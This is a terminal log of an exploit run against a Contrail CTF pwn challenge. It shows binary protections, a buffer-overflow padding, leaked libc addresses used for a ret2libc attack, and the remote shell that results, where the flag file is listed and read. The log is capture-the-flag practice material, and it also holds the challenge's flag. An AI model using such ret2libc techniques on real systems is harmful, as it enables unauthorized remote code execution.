$ python exploit.py r
[*] '/CTF/contrail/welcomechain'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 114.177.250.4 on port 2226: Done
[*] '/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@

printf_addr: 0x7f2d430109c0
libc_base: 0x7f2d42f90000
addr_system: 0x7f2d42fdf440
addr_binsh: 0x7f2d43143e9a
[*] Switching to interactive mode

 ▄▄·        ▐ ▄ ▄▄▄▄▄▄▄▄   ▄▄▄· ▪  ▄▄▌  
▐█ ▌▪▪     •█▌▐█•██  ▀▄ █·▐█ ▀█ ██ ██•  
██ ▄▄ ▄█▀▄ ▐█▐▐▌ ▐█.▪▐▀▀▄ ▄█▀▀█ ▐█·██▪  
▐███▌▐█▌.▐▌██▐█▌ ▐█▌·▐█•█▌▐█ ▪▐▌▐█▌▐█▌▐▌
·▀▀▀  ▀█▄▀▪▀▀ █▪ ▀▀▀ .▀  ▀ ▀  ▀ ▀▀▀.▀▀▀ 

Welcome! Contrail CTF!
Please Input : Your input is : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAv\x05@
$ ls
bin
dev
flag
lib
lib32
lib64
welcomeropchain
$ cat flag
ctrctf{W31c0m3!_c0ntr4i1_ctf_r3t2l1bc!}
$ 
[*] Interrupted
[*] Closed connection to 114.177.250.4 port 2226
